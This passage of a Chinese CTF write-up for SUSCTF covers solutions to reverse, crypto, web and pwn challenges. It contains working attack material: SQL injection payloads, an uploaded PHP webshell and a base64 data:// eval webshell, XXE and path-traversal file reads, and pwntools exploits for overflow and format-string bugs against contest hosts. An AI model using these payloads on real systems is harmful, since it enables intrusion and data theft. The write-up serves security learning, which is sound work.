class=\"number\">93</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">94</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v7[<span class=\"number\">95</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"comment\">//v6 = 1;</span></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( <span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">23</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    st[i] = v7[i*<span class=\"number\">4</span>]+<span class=\"string\">'\\n'</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(st);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://5aku1em.github.io/images/image-20200205191934828.png\" alt=\"image-20200205191934828\"></p>\n<p>观察操作可得出前5个字符是没有计入的</p>\n<p>最终flag可得</p>\n<blockquote>\n<p>flag :  SUSCTF{AA_1s_in_Your_heart}</p>\n</blockquote>\n<h2 id=\"3-crypto\"><a href=\"#3-crypto\" class=\"headerlink\" title=\"3.crypto\"></a>3.crypto</h2><h3 id=\"0x1\"><a href=\"#0x1\" class=\"headerlink\" title=\"0x1\"></a>0x1</h3><p><img src=\"https://5aku1em.github.io/images/image-20200205192241967.png\" alt=\"image-20200205192241967\"></p>\n<p>这个很明显，字符串放进迷宫就是了</p>\n<p>左下角可以作为突破口</p>\n<table>\n<thead>\n<tr>\n<th>S</th>\n<th>U</th>\n<th>S</th>\n<th>C</th>\n<th>T</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>F</td>\n<td>{</td>\n<td>e</td>\n<td>a</td>\n<td>3</td>\n</tr>\n<tr>\n<td>y</td>\n<td>_</td>\n<td>c</td>\n<td>u</td>\n<td>r</td>\n</tr>\n<tr>\n<td>v</td>\n<td>3</td>\n<td>_</td>\n<td>c</td>\n<td>1</td>\n</tr>\n<tr>\n<td>p</td>\n<td>h</td>\n<td>e</td>\n<td>R</td>\n<td>}</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>flag: SUSCTF{ea3y_curv3_c1pheR}</p>\n</blockquote>\n<h3 id=\"0x2-mengxin-lfsr\"><a href=\"#0x2-mengxin-lfsr\" class=\"headerlink\" title=\"0x2  mengxin_lfsr\"></a>0x2  mengxin_lfsr</h3><p><img src=\"https://5aku1em.github.io/images/image-20200205193249483.png\" alt=\"image-20200205193249483\"></p>\n<p>一眼看过去，数字都不是很大，完全可以爆破。过程处理懒得看，反正多半看不懂（</p>\n<p>打表是真理</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">lfsr</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, init, mask, length)</span>:</span></span><br><span class=\"line\">        self.init = init</span><br><span class=\"line\">        self.mask = mask</span><br><span class=\"line\">        self.lengthmask = <span class=\"number\">2</span>**(length+<span class=\"number\">1</span>)<span class=\"number\">-1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">next</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        nextdata = (self.init &lt;&lt; <span class=\"number\">1</span>) &amp; self.lengthmask </span><br><span class=\"line\">        i = self.init &amp; self.mask &amp; self.lengthmask </span><br><span class=\"line\">        output = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> i != <span class=\"number\">0</span>:</span><br><span class=\"line\">            output ^= (i &amp; <span class=\"number\">1</span>)</span><br><span class=\"line\">            i = i &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        nextdata ^= output</span><br><span class=\"line\">        self.init = nextdata</span><br><span class=\"line\">        <span class=\"keyword\">return</span> output</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    N=<span class=\"number\">16</span></span><br><span class=\"line\">    init=<span class=\"number\">52811</span></span><br><span class=\"line\">    <span class=\"comment\">#print(init)</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">100000</span>):</span><br><span class=\"line\">        mask=j</span><br><span class=\"line\">        <span class=\"keyword\">if</span> mask.bit_length()!=N :</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        l = lfsr(init,mask,N)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(N):</span><br><span class=\"line\">            print(l.next(),end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(mask)</span><br><span class=\"line\"><span class=\"comment\">#52811</span></span><br><span class=\"line\"><span class=\"comment\">#0110010100010010</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>最后得到62669符合条件，将62669二进制化1111010011001101</p>\n<blockquote>\n<p>flag:   SUSCTF{1111010011001101}</p>\n</blockquote>\n<h2 id=\"4-web\"><a href=\"#4-web\" class=\"headerlink\" title=\"4.web\"></a>4.web</h2><p>这我是真的很不擅长</p>\n<h3 id=\"0x1-xuanjiang\"><a href=\"#0x1-xuanjiang\" class=\"headerlink\" title=\"0x1 xuanjiang\"></a>0x1 xuanjiang</h3><p>带恶人是大好人！</p>\n<p>看看ppt都可以做的</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205194758756.png\" alt=\"image-20200205194758756\"></p>\n<p>payload：<a href=\"http://94.191.110.143:20007/?a=15604dfe06a5256d&amp;b=%23%27%26&amp;c=flag/I%20need%20flag/\" target=\"_blank\" rel=\"noopener\">http://94.191.110.143:20007/?a=15604dfe06a5256d&amp;b=%23%27%26&amp;c=flag/I%20need%20flag/</a></p>\n<blockquote>\n<p>flag:   SUSCTF{xuan_jiang_mei_bai_zuo} </p>\n</blockquote>\n<h3 id=\"0x2-ez-http-header\"><a href=\"#0x2-ez-http-header\" class=\"headerlink\" title=\"0x2 ez_http_header\"></a>0x2 ez_http_header</h3><p>所有萌新赛都会有的套路题</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205195139495.png\" alt=\"image-20200205195139495\"></p>\n<p>按照步骤走就好了</p>\n<blockquote>\n<p>flag: SUSCTF{Ea5y_hTTp_he4der}</p>\n</blockquote>\n<h3 id=\"0x3-Easy-php\"><a href=\"#0x3-Easy-php\" class=\"headerlink\" title=\"0x3 Easy_php\"></a>0x3 Easy_php</h3><p>众所周知  md5(‘240610708’) == md5(‘<em>QNKCDZO</em>‘) </p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205195326388.png\" alt=\"image-20200205195326388\"></p>\n<p>记得改maxlength，不然填不下</p>\n<blockquote>\n<p>flag:  SUSCTF{He11o_pHp_aga1n!}   </p>\n</blockquote>\n<p>(原本的这道题目bug太大了，填个0不香吗？)</p>\n<h3 id=\"0x4-easy-http\"><a href=\"#0x4-easy-http\" class=\"headerlink\" title=\"0x4  easy_http\"></a>0x4  easy_http</h3><p>我一开始没有理解到题目意思，加之ui和三叶草的很相似，导致我尴尬了好久，一直在哪个输入框输入当前页面的url。。。。</p>\n<p>最后试了试百度的，结果。。。瞬间明白了自己犯傻了（期间也试过一些url，但大部分都比较特别，页面显示不出来，所以走进死胡同）</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205200329321.png\" alt=\"image-20200205200329321\"></p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205200353272.png\" alt=\"image-20200205200353272\"></p>\n<p>简单题想太多就不好了</p>\n<blockquote>\n<p>flag: SUSCTF{UA_1S_34SY}</p>\n</blockquote>\n<h3 id=\"0x5-氪金让你变强\"><a href=\"#0x5-氪金让你变强\" class=\"headerlink\" title=\"0x5  氪金让你变强\"></a>0x5  氪金让你变强</h3><p>我太傻了，啥都不会，那么只好氪金了[doge]</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205200640735.png\" alt=\"image-20200205200640735\"></p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205200628919.png\" alt=\"image-20200205200628919\"></p>\n<p>服务器配置好php之后就一句话 </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">echo</span> $_GET[<span class=\"string\">\"x\"</span>];</span><br></pre></td></tr></table></figure>\n\n<p>跟出题人讨论了一下，感觉如果能获得公网ip，就不需要氪金了，本机可以当做服务器呀（天真</p>\n<h3 id=\"0x6-ez-sql\"><a href=\"#0x6-ez-sql\" class=\"headerlink\" title=\"0x6  ez_sql\"></a>0x6  ez_sql</h3><p>一开始傻了，想复杂了，连JION都出来了，错误示范：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=-1<span class=\"comment\">/**/</span>union<span class=\"comment\">/**/</span><span class=\"keyword\">select</span><span class=\"comment\">/**/</span>*<span class=\"comment\">/**/</span><span class=\"keyword\">from</span><span class=\"comment\">/**/</span>((<span class=\"keyword\">select</span><span class=\"comment\">/**/</span><span class=\"keyword\">group_concat</span>(schema_name<span class=\"comment\">/**/</span>separator<span class=\"comment\">/**/</span><span class=\"number\">0x3c62723e</span>)<span class=\"comment\">/**/</span><span class=\"keyword\">from</span><span class=\"comment\">/**/</span>information_schema.schemata)a<span class=\"comment\">/**/</span><span class=\"keyword\">JOIN</span><span class=\"comment\">/**/</span>(<span class=\"keyword\">select</span><span class=\"comment\">/**/</span><span class=\"number\">2</span>)b)%<span class=\"number\">23</span></span><br></pre></td></tr></table></figure>\n\n<p>其实后来才明白，最后过滤的仅仅只有空格，用/**/代替即可</p>\n<p>然后就是痛苦地搜索，找了半天也没有找到，绝望<del>~</del>，最后就在遗漏的email_id中，我还是切腹自尽吧，太丢人了</p>\n<p>太难受了。。。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">http://47.103.140.44:10002/?id=-1/**/union/**/select/**/(SELECT/**/GROUP_CONCAT(email_id)/**/FROM/**/emails),2%23</span><br></pre></td></tr></table></figure>\n\n\n\n<blockquote>\n<p>flag:  SUSCTF{my_f1rst_st3p_in_sqli} </p>\n</blockquote>\n<h3 id=\"0x7-easy-unserialize\"><a href=\"#0x7-easy-unserialize\" class=\"headerlink\" title=\"0x7  easy_unserialize\"></a>0x7  easy_unserialize</h3><p>这反序列化也忒良心了吧！blog上稍微学一学，依葫芦画瓢</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205202120515.png\" alt=\"image-20200205202120515\"></p>\n<p>随手构建一个,flag在flag.php里面</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205202200901.png\" alt=\"image-20200205202200901\"></p>\n<blockquote>\n<p>flag:  SUSCTF{1asy_Uns1ial1ze}</p>\n</blockquote>\n<h3 id=\"0x8-武林秘籍\"><a href=\"#0x8-武林秘籍\" class=\"headerlink\" title=\"0x8 武林秘籍\"></a>0x8 武林秘籍</h3><p>一天不迫害我就浑身难受吗？？？</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205202555181.png\" alt=\"image-20200205202555181\"></p>\n<p>hackbar随手素质post，加个%就好了</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205202647509.png\" alt=\"image-20200205202647509\"></p>\n<p>查询robots后base64解码</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205202727863.png\" alt=\"image-20200205202727863\"></p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205203315834.png\" alt=\"image-20200205203315834\"></p>\n<p>层层套娃。。。</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205203422685.png\" alt=\"image-20200205203422685\"></p>\n<p>改cookie就好了</p>\n<blockquote>\n<p>flag :  SUSCTF{pHp_1s_so_fun}</p>\n</blockquote>\n<h3 id=\"0x9-uploads\"><a href=\"#0x9-uploads\" class=\"headerlink\" title=\"0x9 uploads\"></a>0x9 uploads</h3><p>趁出题人还没有限制后缀名，菜刀整上！！！</p>\n<p>上传1.php（一句话木马），文件头用GIF89a掩饰就好了。</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205203640142.png\" alt=\"image-20200205203640142\"></p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205205736980.png\" alt=\"image-20200205205736980\"></p>\n<p>顺利逃课</p>\n<blockquote>\n<p>flag: SUSCTF{ez_bypass_upload}</p>\n</blockquote>\n<h3 id=\"0xA-Download-ctf\"><a href=\"#0xA-Download-ctf\" class=\"headerlink\" title=\"0xA  Download_ctf\"></a>0xA  Download_ctf</h3><p>看到此题无需扫描器，我立马就用御剑扫描扫出了upload目录</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205210049871.png\" alt=\"image-20200205210049871\"></p>\n<p>之后的探索太心酸了，哭了，居然不是在/var目录下而是在/app目录下</p>\n<p>如果filename不赋值就下载空文件，文件名是当前所在文件夹的名称，仅仅的线索，我找了很久，在验证了/etc/passwd可行后，我终于海底捞出了</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205210346572.png\" alt=\"image-20200205210346572\"></p>\n<p>php被过滤了，但是不慌，完完全全可以绕过，用flag.pphphp来代替即可</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205210444861.png\" alt=\"image-20200205210444861\"></p>\n<p>OK！！是can’t down ，找到了！！</p>\n<p>把index.php下载下来</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205210544883.png\" alt=\"image-20200205210544883\"></p>\n<p>这些就可以得到flag.php了</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205210712404.png\" alt=\"image-20200205210712404\"></p>\n<blockquote>\n<p>flag:  SUSCTF{d0wnload_1S_d4NG3r}</p>\n</blockquote>\n<h3 id=\"0xB\"><a href=\"#0xB\" class=\"headerlink\" title=\"0xB\"></a>0xB</h3><p>社工找到这个平台的原始数据</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205210929328.png\" alt=\"image-20200205210929328\"></p>\n<p>ok 一葫芦画瓢学XEE</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205211024391.png\" alt=\"image-20200205211024391\"></p>\n<p>得到SUS2019.php的base64编码</p>\n<p>解码可得</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$aa = $_GET[<span class=\"string\">'file'</span>];</span><br><span class=\"line\">$bb = <span class=\"string\">\"SUS2020.php\"</span>;</span><br><span class=\"line\">@parse_str($aa);</span><br><span class=\"line\"><span class=\"keyword\">include</span>($bb);</span><br></pre></td></tr></table></figure>\n\n<p>逃不了逃不了，还是跟include过不去。。。</p>\n<p>第一想法就是利用@parse_str($aa);，来更改bb的值，从而得到flag</p>\n<p>想了半天，最后还是决定用菜刀吧</p>\n<p>payload：<a href=\"http://94.191.110.143:20000/SUS2019.php?file=bb=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA/Pg==\" target=\"_blank\" rel=\"noopener\">http://94.191.110.143:20000/SUS2019.php?file=bb=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA/Pg==</a></p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205211503958.png\" alt=\"image-20200205211503958\"></p>\n<p>找到了，直接打开是不行的，要运行readflag</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205211600757.png\" alt=\"image-20200205211600757\"></p>\n<blockquote>\n<p>flag: SUSCTF{AA_Wants_4_Girlfriend}</p>\n</blockquote>\n<h2 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h2><p>这个pwn是无论如何都必须a的，不然太打脸了</p>\n<h3 id=\"0x1-use-pwntool\"><a href=\"#0x1-use-pwntool\" class=\"headerlink\" title=\"0x1 use_pwntool\"></a>0x1 use_pwntool</h3><p><img src=\"https://5aku1em.github.io/images/image-20200205212450390.png\" alt=\"image-20200205212450390\"></p>\n<p>recv之后interactive就行了</p>\n<blockquote>\n<p>flag:  SUSCTF{pwntools_1s_useful}</p>\n</blockquote>\n<h3 id=\"0x2-input\"><a href=\"#0x2-input\" class=\"headerlink\" title=\"0x2 input\"></a>0x2 input</h3><p>拖进ida先看看漏洞在哪里</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205212856211.png\" alt=\"image-20200205212856211\"></p>\n<p>漏洞函数read,不过读取的大小太小了，不足以直接引导至success函数</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200205212731246.png\" alt=\"image-20200205212731246\"></p>\n<p>有现成的gift函数可以调用</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200206153229210.png\" alt=\"image-20200206153229210\"></p>\n<p>v8要求不能超过100，可是</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200206153302923.png\" alt=\"image-20200206153302923\"></p>\n<p>v8是个unsigned int ，比较的时候又用signed比较，提示已经很明显了，v8&gt;2147483647不就为负数了吗</p>\n<p>read函数只能读8字节，就无法通过直接覆盖的方式调用gift函数。</p>\n<p>首先获得gift函数的地址，然后就是通过输入的v8改变关键的v7,通过数组越界来控制程序</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200206154008803.png\" alt=\"image-20200206154008803\"></p>\n<p>v7的距离为6*16+8=104&gt;100,不过这不是问题</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200206154211694.png\" alt=\"image-20200206154211694\"></p>\n<p>此处的__int16就相当于short类型，也就是说v8应该大于104并且再通过引导其至输入的地址</p>\n<p>0x0068=104，就可以确定最后v8的大小应该为大于2147483647的一个数字且十六进制表示下最后四位为0068，</p>\n<p>可得v8=0x80000068=2147483752，这样就构造完成了，exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">io=remote(<span class=\"string\">'94.191.110.143'</span>,<span class=\"string\">'20013'</span>) </span><br><span class=\"line\">success_add = <span class=\"number\">0x00000000004007BA</span></span><br><span class=\"line\">payload = p64(success_add)</span><br><span class=\"line\"><span class=\"keyword\">print</span> payload</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(<span class=\"string\">\"2147483752\"</span>)</span><br><span class=\"line\">sh.recv()</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>(之前的wp找不到了，无奈重新写一份。。。)</p>\n<h3 id=\"0x3-pwd\"><a href=\"#0x3-pwd\" class=\"headerlink\" title=\"0x3 pwd\"></a>0x3 pwd</h3><p>经典栈溢出类型的题目</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209131016069.png\" alt=\"image-20200209131016069\"></p>\n<p>ida打开发现有直接可以调用的shellcode</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209131105929.png\" alt=\"image-20200209131105929\"></p>\n<p>漏洞函数read，偏移量0x70+8(64位)，</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209131143383.png\" alt=\"image-20200209131143383\"></p>\n<p>调用gift函数的地址即可</p>\n<p>EXP：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh=remote(<span class=\"string\">'94.191.110.143'</span>,<span class=\"string\">'20011'</span>) </span><br><span class=\"line\">success_add = <span class=\"number\">0x00000000004006B6</span></span><br><span class=\"line\">payload = <span class=\"string\">'a'</span>*(<span class=\"number\">7</span>*<span class=\"number\">16</span>+<span class=\"number\">8</span>)+p64(success_add)</span><br><span class=\"line\"><span class=\"comment\">#print payload</span></span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">'pwd: \\n'</span>)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://5aku1em.github.io/images/image-20200209131411666.png\" alt=\"image-20200209131411666\"></p>\n<blockquote>\n<p>flag: SUSCTF{Hhhhh_wE1c0me_5uS}</p>\n</blockquote>\n<h3 id=\"0x4-Pwn3-format\"><a href=\"#0x4-Pwn3-format\" class=\"headerlink\" title=\"0x4  Pwn3-format\"></a>0x4  Pwn3-format</h3><p>格式化字符串，pwntools其实是给了模板函数的</p>\n<p>32位程序</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209131644718.png\" alt=\"image-20200209131644718\"></p>\n<p>没看到更多的信息了</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209131706777.png\" alt=\"image-20200209131706777\"></p>\n<p>漏洞函数printf，使用方法有危险</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209131731248.png\" alt=\"image-20200209131731248\"></p>\n<p>关键点，将传入的year变为2021，</p>\n<p>year为public，在data区可改</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209131817538.png\" alt=\"image-20200209131817538\"></p>\n<p>EXP：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># sh = process('pwd_06807290daabb06d10b26c4bf3806387')</span></span><br><span class=\"line\">io= remote(<span class=\"string\">'106.54.208.253'</span>, <span class=\"number\">2333</span> )</span><br><span class=\"line\"><span class=\"comment\">#io = process('./fmtstr-')</span></span><br><span class=\"line\">payload = fmtstr_payload(<span class=\"number\">4</span>,&#123;<span class=\"number\">0x0804C040</span>:<span class=\"number\">0x7E5</span>&#125;)<span class=\"comment\">#偏移量其实蛮好计算的</span></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">'here:\\n'</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>得到flag</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209132002075.png\" alt=\"image-20200209132002075\"></p>\n<blockquote>\n<p>flag:    SUSCTF{F0RM4t_1s_1MP0RT4NT} </p>\n</blockquote>\n<h3 id=\"0x5-rand\"><a href=\"#0x5-rand\" class=\"headerlink\" title=\"0x5 rand\"></a>0x5 rand</h3><p>的的确确更像一道misc，不过其实挺好的</p>\n<p>一开始设置的srand(time(0)),忽视了运行的时间差，导致一直无结果，试了上万次，有点崩溃，换了很多种方法，最后改成srand(time(0)+1)就立马出结果了。。。我真是作死</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209132416048.png\" alt=\"image-20200209132416048\"></p>\n<p>代码言简意赅，就是要使得伪随机的种子一样罢了。</p>\n<p>给出一个复杂的做法</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//make.cpp</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;bits/stdc++.h&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">\tfreopen(<span class=\"string\">\"ans.txt\"</span>,<span class=\"string\">\"w\"</span>,<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v3=time(<span class=\"number\">0L</span>L);\t</span><br><span class=\"line\">\tsrand(v3+<span class=\"number\">1</span>); </span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;=<span class=\"number\">99</span>;++i)&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>,rand()%<span class=\"number\">2020</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>直接用c++源程序生成数据</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#rand.py</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"comment\"># context.log_level = \"debug\"</span></span><br><span class=\"line\"><span class=\"comment\">#elf = cdll.LoadLibrary('libc.so.6')</span></span><br><span class=\"line\">os.system(<span class=\"string\">'./make'</span>)</span><br><span class=\"line\"><span class=\"comment\">#elf.srand(elf.time(0))</span></span><br><span class=\"line\">p = remote(<span class=\"string\">'49.235.241.216'</span>, <span class=\"number\">49154</span>)</span><br><span class=\"line\">f=open(<span class=\"string\">'ans.txt'</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">100</span>):</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">': '</span>)</span><br><span class=\"line\">\ttmp=f.readline()</span><br><span class=\"line\">\tp.send(tmp)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>脚本直接调用，注释掉的是直接用ctypes库调用libc.so.6直接生成响应的随机数，就无需c++脚本了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#r.py</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10000</span>):</span><br><span class=\"line\">\tos.system(<span class=\"string\">'python rand.py'</span>)</span><br></pre></td></tr></table></figure>\n\n<p>重复调用脚本，直至成功</p>\n<p><img src=\"https://5aku1em.github.io/images/image-20200209134046236.png\" alt=\"image-20200209134046236\"></p>\n<blockquote>\n<p>flag:  SUSCTF{happy_new_year_2020}</p>\n</blockquote>\n<h3 id=\"0x6-Hello-pwn\"><a href=\"#0x6-Hello-pwn\" class=\"headerlink\" title=\"0x6 Hello_pwn\"></a>0x6 